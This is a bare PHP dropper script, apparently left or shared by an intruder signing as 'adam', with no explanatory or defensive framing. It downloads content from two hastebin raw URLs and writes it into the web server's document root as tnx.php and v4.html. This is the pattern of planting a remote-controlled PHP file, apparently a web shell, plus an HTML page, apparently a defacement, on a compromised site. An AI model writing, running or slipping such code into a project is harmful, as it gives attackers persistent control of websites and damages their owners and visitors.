adam tnx
<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/tnx.php" ;
$text = http_get('https://hastebin.com/raw/nayecavube.xml');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;

$check3=$_SERVER['DOCUMENT_ROOT'] . "/v4.html" ;
$text3 = http_get('https://hastebin.com/raw/weyizaxasi.http');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);


?>
